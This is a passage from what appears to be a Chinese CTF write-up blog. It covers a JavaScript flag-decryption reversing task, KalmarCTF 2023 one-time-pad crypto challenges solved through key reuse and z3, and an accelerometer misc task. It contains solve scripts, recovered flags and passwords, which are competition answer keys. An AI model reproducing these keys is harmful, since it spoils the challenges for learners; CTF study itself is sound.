<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module.exports = (i, j, t) =&gt; (</span><br><span class="line">  (i += []),</span><br><span class="line">  j + &quot;&quot;,</span><br><span class="line">  (t = (t + &#123;&#125;).split(&quot;[&quot;)[0]),</span><br><span class="line">  JSON.parse(</span><br><span class="line">    `&#123;&quot;__proto__&quot;:&#123;&quot;data&quot;:&#123;&quot;name&quot;:&quot;./$&#123;i&#125;&quot;,&quot;exports&quot;:&#123;&quot;.&quot;: &quot;./$&#123;j&#125;.js&quot;&#125;&#125;,&quot;path&quot;: &quot;./&quot;&#125;&#125;`</span><br><span class="line">  )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>json.parse解析了字符串，其实就是调用了变量j的js，name被命名为变量i，不知道干啥用。</p>
<p>434.js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">module.exports=(i,j,t)=&gt;(i%=30,j%=30,t%=30,i+=[],j+&quot;&quot;,t=(t+&#123;&#125;).split(&quot;[&quot;)[0],f[j]^=f[i])</span><br></pre></td></tr></table></figure>
<p>出现了加密计算：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f[j]^=f[i])</span><br></pre></td></tr></table></figure>
<p>之后再看一些语句，都是一直调用某个js，然后创建对象，嵌套调用js，直到下一个加密</p>
<p>那么事情就简单很多了，将加密流程输出，写出逆向过程就行了</p>
<p>那就需要判断出有多少种的加密了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f[i]*=-1,f[i]&amp;=0xff</span><br><span class="line">f[i]+=f[j],f[i]&amp;=0xff</span><br><span class="line">f[i]*=f[25],f[i]&amp;=0xff</span><br><span class="line">f[i]*=f[30],f[i]&amp;=0xff</span><br><span class="line">f[i]/=f[15],f[i]&amp;=0xff</span><br><span class="line">f[i]*=f[13],f[i]&amp;=0xff</span><br><span class="line">....</span><br><span class="line">似乎手动不太行</span><br></pre></td></tr></table></figure>
<p>脚本改一下，使用console.log显示出全部的加密过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import glob</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">js_files = glob.glob(&quot;*.js&quot;)</span><br><span class="line"></span><br><span class="line">for file in js_files:</span><br><span class="line">    if file != &#x27;required.js&#x27;:</span><br><span class="line">        f = open(file, &quot;r&quot;)</span><br><span class="line">        content = f.read()</span><br><span class="line">        if &#x27;i%=30&#x27; in content:</span><br><span class="line">            pattern = r&#x27;f\[.*&#x27;</span><br><span class="line">            match = re.search(pattern, content)</span><br><span class="line">            pattern = re.escape(&#x27;split(&quot;[&quot;)[0],&#x27;)</span><br><span class="line">            match1 = re.search(pattern, content)</span><br><span class="line">            patch = match.group(0).replace(&#x27;i&#x27;, &#x27;\&quot; + i + \&quot;&#x27;).replace(&#x27;j&#x27;, &#x27;\&quot; + j + \&quot;&#x27;).replace(&#x27;t&#x27;, &#x27;\&quot; + t + \&quot;&#x27;)</span><br><span class="line">            p = &#x27;split(&quot;[&quot;)[0],&#x27; + &#x27;console.log(&quot;&#x27; + patch + &#x27;&quot;),&#x27;</span><br><span class="line">            print(p)</span><br><span class="line">            content = content.replace(&#x27;split(&quot;[&quot;)[0],&#x27;,p)</span><br><span class="line">            f = open(file, &quot;w&quot;)</span><br><span class="line">            f.write(content)</span><br></pre></td></tr></table></figure>
<p>然后写出全部的逆过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">with open(&quot;1.txt&quot;, &quot;r&quot;) as f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line"></span><br><span class="line"># 交换最后一行和第一行</span><br><span class="line">lines[0], lines[-1] = lines[-1], lines[0]</span><br><span class="line"></span><br><span class="line"># 倒置除第一行和最后一行以外的所有行</span><br><span class="line">lines[1:-1] = reversed(lines[1:-1])</span><br><span class="line"></span><br><span class="line">with open(&quot;filename.txt&quot;, &quot;w&quot;) as f:</span><br><span class="line">    f.writelines(lines)</span><br><span class="line"></span><br><span class="line">parterm1 = r&#x27;f\[\d+\]=~f\[\d+\]&amp;0xff&#x27;</span><br><span class="line"># ma1=re.search(parterm1,&#x27;f[0]=~f[0]&amp;0xff&#x27;)</span><br><span class="line"></span><br><span class="line">parterm4 = r&#x27;f\[\d+\]\^\=f\[\d+\]&#x27;</span><br><span class="line"># ma4= re.search(parterm4,&#x27;f[24]^=f[12]&#x27;)</span><br><span class="line"></span><br><span class="line">parterm5 = r&#x27;f\[\d+\]=\(\(\(f\[\d+\]\*0x0802&amp;0x22110\)\|\(f\[\d+\]\*0x8020\&amp;0&#x27;</span><br><span class="line"># ma5 = re.search(parterm5,&#x27;f[15]=(((f[15]*0x0802&amp;0x22110)|(f[15]*0x8020&amp;0x88440))*0x10101&gt;&gt;&gt;16)&amp;0xff&#x27;)</span><br><span class="line"></span><br><span class="line">parterm2 = r&#x27;f\[\d+\]\-\=f\[\d+\],f\[\d+\]&amp;=0xff&#x27;</span><br><span class="line"># ma2= re.search(parterm2,&#x27;f[15]-=f[17],f[15]&amp;=0xff&#x27;)</span><br><span class="line"></span><br><span class="line">parterm3 = r&#x27;f\[\d+\]\+\=f\[\d+\],f\[\d+\]&amp;=0xff&#x27;</span><br><span class="line"># ma3= re.search(parterm3,&#x27;f[15]+=f[17],f[15]&amp;=0xff&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parterm6 = r&#x27;f\[\d+\]=f\[\d+\]\&lt;\&lt;1\&amp;0xff\|f\[\d+\]\&gt;\&gt;7&#x27;</span><br><span class="line"># ma6 = re.search(parterm6,&#x27;f[11]=f[11]&lt;&lt;1&amp;0xff|f[11]&gt;&gt;7&#x27;)</span><br><span class="line"></span><br><span class="line">parterm7 = r&#x27;f\[\d+\]=f\[\d+\]\&lt;\&lt;7\&amp;0xff\|f\[\d+\]\&gt;\&gt;1&#x27;</span><br><span class="line"># ma7 = re.search(parterm7,&#x27;f[11]=f[11]&lt;&lt;7&amp;0xff|f[11]&gt;&gt;1&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parterm8 = r&#x27;f\[\d+\]=f\[\d+\]\^\(f\[\d+\]\&gt;\&gt;1\)&#x27;</span><br><span class="line"># ma8 = re.search(parterm8,&#x27;f[14]=f[14]^(f[14]&gt;&gt;1)&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(&quot;filename.txt&quot;, &quot;r&quot;)</span><br><span class="line">w = open(&quot;2.txt&quot;, &quot;w&quot;)</span><br><span class="line">while True:</span><br><span class="line">    line = f.readline()</span><br><span class="line">    if not line:</span><br><span class="line">        break</span><br><span class="line">    lines = line.replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line">    if re.search(parterm1, lines) or re.search(parterm4, lines) or re.search(parterm5, lines):</span><br><span class="line">        w.write(line)</span><br><span class="line">    elif re.search(parterm3, lines):</span><br><span class="line">        pattern = r&quot;\d+&quot;</span><br><span class="line">        matches = re.findall(pattern, lines)</span><br><span class="line">        num1 = int(matches[0])</span><br><span class="line">        num2 = int(matches[1])</span><br><span class="line">        new_str = re.sub(rf&quot;f\[&#123;num1&#125;\]\+=f\[&#123;num2&#125;\]&quot;, rf&quot;f[&#123;num1&#125;]-=f[&#123;num2&#125;]&quot;, lines)</span><br><span class="line">        w.write(new_str + &quot;\n&quot;)</span><br><span class="line">    elif re.search(parterm2, lines):</span><br><span class="line">        pattern = r&quot;\d+&quot;</span><br><span class="line">        matches = re.findall(pattern, lines)</span><br><span class="line">        num1 = int(matches[0])</span><br><span class="line">        num2 = int(matches[1])</span><br><span class="line">        new_str = re.sub(rf&quot;f\[&#123;num1&#125;\]-=f\[&#123;num2&#125;\]&quot;, rf&quot;f[&#123;num1&#125;]+=f[&#123;num2&#125;]&quot;, lines)</span><br><span class="line">        w.write(new_str + &quot;\n&quot;)</span><br><span class="line">    elif re.search(parterm6, lines):</span><br><span class="line">        pattern = r&quot;\d+&quot;</span><br><span class="line">        matches = re.findall(pattern, lines)</span><br><span class="line">        new_str = re.sub(rf&quot;&lt;&lt;1&quot;, rf&quot;&lt;&lt;7&quot;, lines)</span><br><span class="line">        new_str = re.sub(rf&quot;&gt;&gt;7&quot;, rf&quot;&gt;&gt;1&quot;, new_str)</span><br><span class="line">        w.write(new_str + &quot;\n&quot;)</span><br><span class="line">    elif re.search(parterm7, lines):</span><br><span class="line">        pattern = r&quot;\d+&quot;</span><br><span class="line">        matches = re.findall(pattern, lines)</span><br><span class="line">        new_str = re.sub(rf&quot;&lt;&lt;7&quot;, rf&quot;&lt;&lt;1&quot;, lines)</span><br><span class="line">        new_str = re.sub(rf&quot;&gt;&gt;1&quot;, rf&quot;&gt;&gt;7&quot;, new_str)</span><br><span class="line"></span><br><span class="line">        w.write(new_str + &quot;\n&quot;)</span><br><span class="line">    elif re.search(parterm8, lines):</span><br><span class="line">        pattern = r&quot;\d+&quot;</span><br><span class="line">        matches = re.findall(pattern, lines)</span><br><span class="line">        num = int(matches[0])</span><br><span class="line">        new_str = &#x27;for (var i = 0; i &lt;= 255; i++) &#123;\n&#x27; + &#x27;if ((i^(i&gt;&gt;1)) == f[&#x27; + str(num) + &#x27;]) &#123;\n&#x27; + &#x27;f[&#x27; + str(</span><br><span class="line">            num) + &#x27;]=i\n&#x27;</span><br><span class="line">        new_str = new_str + &#x27;break\n&#x27; + &quot;&#125;&#125;&quot;</span><br><span class="line">        w.write(new_str + &quot;\n&quot;)</span><br></pre></td></tr></table></figure>
<p>将密文转为整型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s=bytes.fromhex(&quot;d19ee193b461fd8d1452e7659acb1f47dc3ed445c8eb4ff191b1abfa7969&quot;)</span><br><span class="line">for i in s:</span><br><span class="line">    print(int(i),end=&#x27;,&#x27;)</span><br></pre></td></tr></table></figure>
<p>放入处理好的js文件当中，最后添加console.log(f);</p>
<p>node exp.js得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  104, 120, 112, 123,  67,  97, 110,</span><br><span class="line">  110,  48, 116,  95, 102,  49, 110,</span><br><span class="line">  100,  95, 109,  48, 100, 117, 108,</span><br><span class="line">  101,  95,  39, 102, 108,  52, 103,</span><br><span class="line">   39, 125</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>解密可得</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t=[</span><br><span class="line">  104, 120, 112, 123,  67,  97, 110,</span><br><span class="line">  110,  48, 116,  95, 102,  49, 110,</span><br><span class="line">  100,  95, 109,  48, 100, 117, 108,</span><br><span class="line">  101,  95,  39, 102, 108,  52, 103,</span><br><span class="line">   39, 125</span><br><span class="line">]</span><br><span class="line">for i in t:</span><br><span class="line">    print(chr(i),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023kalmarctf复现</title>
    <url>/2023/03/06/13-29-58/</url>
    <content><![CDATA[<h1>2023kalmarctf</h1>
<span id="more"></span>
<h2 id="crypto">crypto</h2>
<h3 id="BabyOneTimePad">BabyOneTimePad</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">PASS_LENGTH_BYTES = 128</span><br><span class="line"></span><br><span class="line">def encrypt_otp(cleartext, key = os.urandom(PASS_LENGTH_BYTES)):</span><br><span class="line">    ciphertext = bytes([key[i % len(key)] ^ x for i,x in enumerate(cleartext.hex().encode())])</span><br><span class="line">    return ciphertext, key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(&#x27;According to Wikipedia:&#x27;)</span><br><span class="line">    print(&#x27;&quot;In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, but requires the use of a single-use pre-shared key that is not smaller than the message being sent.&quot;&#x27;)</span><br><span class="line">    print(&#x27;So have fun trying to figure out my password!&#x27;)</span><br><span class="line">    password = os.urandom(PASS_LENGTH_BYTES)</span><br><span class="line"></span><br><span class="line">    enc, _ = encrypt_otp(password)</span><br><span class="line">    print(f&#x27;Here is my password encrypted with a one-time pad: &#123;enc.hex()&#125;&#x27;)</span><br><span class="line">    print(&#x27;Actually, I will give you my password encrypted another time.&#x27;)</span><br><span class="line">    print(&#x27;This time you are allowed to permute the password first&#x27;)</span><br><span class="line">    permutation = input(&#x27;Permutation: &#x27;)</span><br><span class="line">    try:</span><br><span class="line">        permutation = [int(x) for x in permutation.strip().split(&#x27;,&#x27;)]</span><br><span class="line">        assert set(permutation) == set(range(PASS_LENGTH_BYTES))</span><br><span class="line">        enc, _ = encrypt_otp(bytes([password[permutation[i]] for i in range(PASS_LENGTH_BYTES)]))</span><br><span class="line">        print(f&#x27;Here is the permuted password encrypted with another one-time pad: &#123;enc.hex()&#125;&#x27;)</span><br><span class="line">    except:</span><br><span class="line">        print(&#x27;Something went wrong!&#x27;)</span><br><span class="line">        exit(1)</span><br><span class="line">    password_guess = input(&#x27;What is my password: &#x27;)</span><br><span class="line">    try:</span><br><span class="line">        password_guess = bytes.fromhex(password_guess)</span><br><span class="line">    except:</span><br><span class="line">        print(&#x27;Something went wrong!&#x27;)</span><br><span class="line">        exit(1)</span><br><span class="line">    if password_guess == password:</span><br><span class="line">        with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">            flag = f.read()</span><br><span class="line">            print(f&#x27;The flag is &#123;flag&#125;&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;Nope.&#x27;)</span><br></pre></td></tr></table></figure>
<p>整个代码就是需要猜出password，第一次给出与key的异或结果，第二次我们可以控制password的置换位置结果，只要是permutation包含0-127的数字都存在就行，也就是说可以传入前面全部都是0，后面是1-127使得传入的password都是第一个字节，那么思路上面很简单。</p>
<p>那么只要恢复key和由key以及密文就可以解出明文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def encrypt_otp(cleartext, key = os.urandom(PASS_LENGTH_BYTES)):</span><br><span class="line">    ciphertext = bytes([key[i % len(key)] ^ x for i,x in enumerate(cleartext.hex().encode())])</span><br><span class="line">    return ciphertext, key</span><br></pre></td></tr></table></figure>
<p>这个函数就是加密函数</p>
<p>那么如果我们知道cleartext，那么就可以知道key，因为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encrypt_otp(t,c2)==key*2 # 其中t是password第一个字节*128，c2是第二次加密密文</span><br></pre></td></tr></table></figure>
<p>然后写出解密函数(假如知道key 的情况下面)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def decrypt_otp(ciphertext, key):</span><br><span class="line">    cleartext = bytes([key[i % len(key)] ^ x for i,x in enumerate(ciphertext)])</span><br><span class="line">    cleartext = bytes.fromhex(cleartext.decode())</span><br><span class="line">    return cleartext</span><br></pre></td></tr></table></figure>
<p>这时候我们只要通过爆破password的第一个字节，产生的key尝试去解出password就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c1=&#x27;35514e2c9d23bc0e0659b606173b5b4073985fa90e9aefe75b28fbaa0e8f7730ba242b9236b9fd58f65d4de7ce0c07befa8c14c8bd66035e1e26ddeb16ceae53741d18a15814e1b8cdc1fd4a932dd9ff792579a872864e98b56958a8f236a6f191e54d459a6430435cc11080fda483cb1ba5672ab5d6d96411b9c6c78d15988330011b7c9a29ba0b030eb151176a091579cf59aa5dccebe25a2caeab0f8e706cbf777e9737eda103a10c46e6990b5fbba88b15cae736570e1b7f8cbc47cbab05754d1ef70449b3b8c995fe1d932989ab7d7722a572861c9be2385efdf06df8aa99b71a17c833374f5ccf14d4a8f9869f43f53621e4d9d93246b09492df159fdb&#x27;</span><br><span class="line">c2=&#x27;35514f2c9e29ba0d0009e003106b5a4572985cfc5ecfb8e10b2af9af0889763bbd212ec033bdf709f10f4ce1cf5a54ebad8d1ecaed3404091974dae940ceac05724d48f40f43e4eac897fc4b992c88aa797229a370d61d9ce16d5cfef73daca192e51a12983467440ac51282fef2839c48a33021e4d3d86012bb95c0da409f8935514f2c9e29ba0d0009e003106b5a4572985cfc5ecfb8e10b2af9af0889763bbd212ec033bdf709f10f4ce1cf5a54ebad8d1ecaed3404091974dae940ceac05724d48f40f43e4eac897fc4b992c88aa797229a370d61d9ce16d5cfef73daca192e51a12983467440ac51282fef2839c48a33021e4d3d86012bb95c0da409f89&#x27;</span><br><span class="line">c1=bytes.fromhex(c1)</span><br><span class="line">c2=bytes.fromhex(c2)</span><br><span class="line">def encrypt_otp(cleartext, key):</span><br><span class="line">    ciphertext = bytes([key[i % len(key)] ^ x for i,x in enumerate(cleartext.hex().encode())])</span><br><span class="line">    return ciphertext</span><br><span class="line"></span><br><span class="line">def decrypt_otp(ciphertext, key):</span><br><span class="line">    cleartext = bytes([key[i % len(key)] ^ x for i,x in enumerate(ciphertext)])</span><br><span class="line">    cleartext = bytes.fromhex(cleartext.decode())</span><br><span class="line">    return cleartext.hex()</span><br><span class="line">key= b&#x27;\x07b&#125;\x1f\xac\x1a\x88&gt;2:\xd20&quot;Xhv@\xabn\xcfl\xfc\x8a\xd29\x19\xcb\x9c:\xbaD\x08\x8f\x12\x1c\xf3\x01\x8e\xc5:\xc3&lt;~\xd2\xfdif\xd8\x9f\xbe,\xf9\xdf\x076:+G\xe8\xdar\xfd\x9e6@~z\xc7=p\xd6\xd9\xfa\xa4\xcex\xab\x1f\xba\x99KA\x1b\x90B\xe5/\xaf\xd3^n\xcd\xc5\x0e\x9e\x92\xa0\xd6(!\xaa\x07Uw8\xf6 \xb1\xcc\xc1\xb1\xafz\x90\x02\x12\xd6\xe0\xeaS \x88\xa7\xf3\xe8s\xad\xba&#x27;</span><br><span class="line">ciphertext= b&#x27;5QO,\x9e)\xba\r\x00\t\xe0\x03\x10kZEr\x98\\\xfc^\xcf\xb8\xe1\x0b*\xf9\xaf\x08\x89v;\xbd!.\xc03\xbd\xf7\t\xf1\x0fL\xe1\xcfZT\xeb\xad\x8d\x1e\xca\xed4\x04\t\x19t\xda\xe9@\xce\xac\x05rMH\xf4\x0fC\xe4\xea\xc8\x97\xfcK\x99,\x88\xaayr)\xa3p\xd6\x1d\x9c\xe1m\\\xfe\xf7=\xac\xa1\x92\xe5\x1a\x12\x984gD\n\xc5\x12\x82\xfe\xf2\x83\x9cH\xa30!\xe4\xd3\xd8`\x12\xbb\x95\xc0\xda@\x9f\x895QO,\x9e)\xba\r\x00\t\xe0\x03\x10kZEr\x98\\\xfc^\xcf\xb8\xe1\x0b*\xf9\xaf\x08\x89v;\xbd!.\xc03\xbd\xf7\t\xf1\x0fL\xe1\xcfZT\xeb\xad\x8d\x1e\xca\xed4\x04\t\x19t\xda\xe9@\xce\xac\x05rMH\xf4\x0fC\xe4\xea\xc8\x97\xfcK\x99,\x88\xaayr)\xa3p\xd6\x1d\x9c\xe1m\\\xfe\xf7=\xac\xa1\x92\xe5\x1a\x12\x984gD\n\xc5\x12\x82\xfe\xf2\x83\x9cH\xa30!\xe4\xd3\xd8`\x12\xbb\x95\xc0\xda@\x9f\x89&#x27;</span><br><span class="line">Permutation: 0,.....0,1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127</span><br><span class="line"># print(encrypt_otp(t,c2)==key*2)</span><br><span class="line">for i in range(256):</span><br><span class="line">    s=chr(i).encode()*128</span><br><span class="line">    key=encrypt_otp(s,c2)</span><br><span class="line">    try:</span><br><span class="line">        decrypt_otp(c1,key)</span><br><span class="line">        print(chr(i))</span><br><span class="line">        print(bytes.fromhex(decrypt_otp(c1,key)))</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">password = b&#x27;\x233\x19@L\xd6\\63\x1f\xbf\xe5\xb1\x06E8Vzw\x8bZ5&gt;\xaf\xe2\x81\xba]ZQ\xd3\x0eL\xbf\xedz~2\x82\xcf-\xb8\x0c\xa7\xf7nx\x8c\x13\xed\x0c\xe4\xd7\x01\x1e-\xa5\xe8\xc67\x11\xa4\xefY|\xfcc%\x14\xcaR\xac\x9d~\x10\xa0\xc5\xe7TM\x0e\xbdl\xd9\xb0\x84\xdb\x9cu\x93\x81\xa4\x08\xdfVSS\xd0\x99\xea1\x0e\x862f\x95\x0c4\x1f\x00\\\xf8\x9a&amp;\xb4\xb8\xd9N\xd8p\x9eC):\xf8:\x7f*&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那么就可以解出password了</p>
<p>注意：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i,x in enumerate(cleartext.hex().encode())</span><br></pre></td></tr></table></figure>
<p>会导致加密的长度发生变化</p>
<p>另外就是Permutation的零的个数问题，可能当时传少了，导致本地数据打通了，一打远程就炸。</p>
<p>还有就是如果利用pwntools打远程的话会导致try失效，所以本地跑脚本会让在解密出现不是utf-8编码的时候返回error，这样才能解密（大概是我的问题？？？）</p>
<h3 id="EasyOneTimePad">EasyOneTimePad</h3>
<p>在上一题的基础上，修复了非预期。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assert len(permutation) == PASS_LENGTH_BYTES #确保长度</span><br><span class="line">key = os.urandom(PASS_LENGTH_BYTES) #保证两次使用了不一样的密钥</span><br></pre></td></tr></table></figure>
<p>那么，整个计算采用了两次密钥参与计算，计算上只是简单的异或，那么可以使用sage的多项式环解线性方程，或者使用z3约束求解（主要只是异或操作，容易求解）</p>
<p><a href="https://blog.maple3142.net/2023/03/05/kalmarctf-2023-writeups/#babyonetimepad">KalmarCTF 2023 WriteUps | 廢文集中區 (maple3142.net)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def encrypt_otp_z3(pt_hex, key):</span><br><span class="line">    ciphertext = [key[i % len(key)] ^ x for i, x in enumerate(pt_hex)]</span><br><span class="line">    return ciphertext, key</span><br><span class="line"></span><br><span class="line">def solve(ct1, ct2):</span><br><span class="line">    sol = Solver()</span><br><span class="line">    pt_hex_sym = [BitVec(f&quot;pt_hex_&#123;i&#125;&quot;, 8) for i in range(PASS_LENGTH_BYTES * 2)]</span><br><span class="line">    for x in pt_hex_sym:</span><br><span class="line">        sol.add(Or([x == t for t in b&quot;0123456789abcdef&quot;]))</span><br><span class="line">    pt_sym = [(x, y) for x, y in zip(pt_hex_sym[::2], pt_hex_sym[1::2])]</span><br><span class="line">    pt2_sym = [pt_sym[perm[i]] for i in range(PASS_LENGTH_BYTES)]</span><br><span class="line">    pt2_hex_sym = sum([list(x) for x in pt2_sym], [])</span><br><span class="line">    key_sym = [BitVec(f&quot;key_&#123;i&#125;&quot;, 8) for i in range(PASS_LENGTH_BYTES)]</span><br><span class="line">    enc_sym, _ = encrypt_otp_z3(pt_hex_sym, key_sym)</span><br><span class="line">    for x, y in zip(ct1, enc_sym):</span><br><span class="line">        sol.add(x == y)</span><br><span class="line">    enc2_sym, _ = encrypt_otp_z3(pt2_hex_sym, key_sym)</span><br><span class="line">    for x, y in zip(ct2, enc2_sym):</span><br><span class="line">        sol.add(x == y)</span><br><span class="line">    assert sol.check() == sat</span><br><span class="line">    m = sol.model()</span><br><span class="line">    pt_hex = [m[x].as_long() for x in pt_hex_sym]</span><br><span class="line">    pwd = bytes.fromhex(&quot;&quot;.join([f&quot;&#123;x:02x&#125;&quot; for x in pt_hex])).decode()</span><br><span class="line">    return pwd</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pt_hex_sym = [BitVec(f&quot;pt_hex_&#123;i&#125;&quot;, 8) for i in range(PASS_LENGTH_BYTES * 2)]</span><br><span class="line">for x in pt_hex_sym:</span><br><span class="line">	sol.add(Or([x == t for t in b&quot;0123456789abcdef&quot;]))</span><br></pre></td></tr></table></figure>
<p>确保明文是16进制数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pt_sym = [(x, y) for x, y in zip(pt_hex_sym[::2], pt_hex_sym[1::2])] #合并形成两个16字节</span><br><span class="line">pt2_sym = [pt_sym[perm[i]] for i in range(PASS_LENGTH_BYTES)]  #第二次加密密文的置换</span><br><span class="line">pt2_hex_sym = sum([list(x) for x in pt2_sym], []) #将字节转化为列表，相当分离16进制的两位</span><br></pre></td></tr></table></figure>
<p>然后添加条件，加密和密文相同</p>
<p>解出结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m[x].as_long()</span><br></pre></td></tr></table></figure>
<p>这个代码片段是在求解器的模型 <code>m</code> 中获取一个符号变量 <code>x</code> 的具体值。<code>m[x]</code> 表示 <code>x</code> 在模型中的值，它是一个 <code>BitVecRef</code> 对象，表示一个二进制位向量。而 <code>as_long()</code> 方法则将这个二进制位向量转换为对应的整数值。</p>
<p>然后转为16进制就行了</p>
<p>官方解法：<a href="https://github.com/kalmarunionenctf/kalmarctf-2023/blob/main/crypto/EasyOneTimePad/solution/solve.py">kalmarctf-2023/solve.py at main · kalmarunionenctf/kalmarctf-2023 (github.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">官方的思想是，利用阶为2的环解线性方程组</span><br><span class="line">但是一组密文没有办法解出，因为构成的矩阵不是满秩的</span><br><span class="line">利用置换构造，将矩阵填成满秩的，假设知道一个字节，解出全部的明文，并且确保在16进制内即可</span><br><span class="line">并且解法上使用16进制高位和低位分别爆破</span><br></pre></td></tr></table></figure>
<p>本地调试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">remote = pwnlib.tubes.process.process(&#x27;./challenge.py&#x27;)</span><br></pre></td></tr></table></figure>
<h2 id="misc">misc</h2>
<h3 id="kalmarunionen-fun">kalmarunionen-fun</h3>
<p>题目给出了传感器的xyz轴的加速度。</p>
<p>这题属实是从来没有涉及过的</p>
<p>那么就简单跟着官方wp学习一下数据处理就好了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">fname = sys.argv[1]</span><br><span class="line"></span><br><span class="line">prefix = &quot;&quot;</span><br><span class="line">if len(sys.argv)&gt;2:</span><br><span class="line">    prefix = sys.argv[2]</span><br><span class="line"></span><br><span class="line">f=open(fname)</span><br><span class="line">d=f.readlines()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">xarr = []</span><br><span class="line">yarr = []</span><br><span class="line">m = len(d)</span><br><span class="line">for line in d:</span><br><span class="line">    datatuple = eval(line)</span><br><span class="line">    xarr.append(datatuple[0])</span><br><span class="line">    yarr.append(datatuple[1])</span><br><span class="line"></span><br><span class="line">marr = [abs(x)+abs(y) for x,y in zip(xarr,yarr)]</span><br><span class="line">darr = [1 if x&gt;1.3 else 0 for x in marr]</span><br><span class="line">conseq0 = 0</span><br><span class="line">conseq1 = 0</span><br><span class="line">curlvl = 0</span><br><span class="line">signnum = 0</span><br><span class="line">lvlarr = []</span><br><span class="line">lastlvlchange = 0</span><br><span class="line"></span><br><span class="line">for i in range(len(darr)):</span><br><span class="line">    if darr[i]==0:</span><br><span class="line">        conseq0 += 1</span><br><span class="line">        conseq1 = 0</span><br><span class="line">    elif darr[i]==1:</span><br><span class="line">        conseq1 += 1</span><br><span class="line">        conseq0 = 0</span><br><span class="line">    if conseq0&gt;=4 and curlvl==1 and (i-lastlvlchange)&gt;23:</span><br><span class="line">        curlvl = 0</span><br><span class="line">        signnum += 1</span><br><span class="line">        print(&quot;Symbol &quot; + str(signnum) + &quot; length &quot; + str(i-lastlvlchange) + &quot; from &quot; + str(lastlvlchange) + &quot; to &quot; + str(i))</span><br><span class="line">        g=open(prefix + &quot;-&quot; + str(signnum) + &quot;.txt&quot;, &quot;w&quot;)</span><br><span class="line">        for x in zip(xarr[lastlvlchange:i], yarr[lastlvlchange:i]):</span><br><span class="line">            g.write(str(x) + &quot;\n&quot;)</span><br><span class="line">        g.close()</span><br><span class="line">        lastlvlchange = i</span><br><span class="line">    elif conseq1&gt;=4 and curlvl==0:</span><br><span class="line">        curlvl = 1</span><br><span class="line">        #signnum += 1</span><br><span class="line">    lvlarr.append(signnum)</span><br></pre></td></tr></table></figure>
<p>整个传感器的加速度由于现实上的测量无法做到平稳，需要一定的时间的数据才能认定该方向上的数据成立</p>
<p>将x,y的加速度提取出来。使用darr储存。跟踪conseq0和conseq1变量中零和一的连续运行长度。如果检测到至少4个时间步长的零运行，并且信号电平当前很高（curlvl=1），并且距离检测到最后一个符号已经有足够的时间（（i-lastlvlchange）&gt;23），脚本假定一个符号刚刚结束并开始一个新符号。它增加signnum变量以跟踪到目前为止检测到的符号数量，并打印出有关刚刚结束的符号的长度和时间的信息。它还将与该符号对应的加速度计数据写入一个新文件，该文件的名称基于命令行上提供的前缀。 如果检测到至少4个时间步长的运行，并且信号电平当前为低（curlvl=0），则脚本假定新符号刚刚开始并将curlvl设置为1。</p>
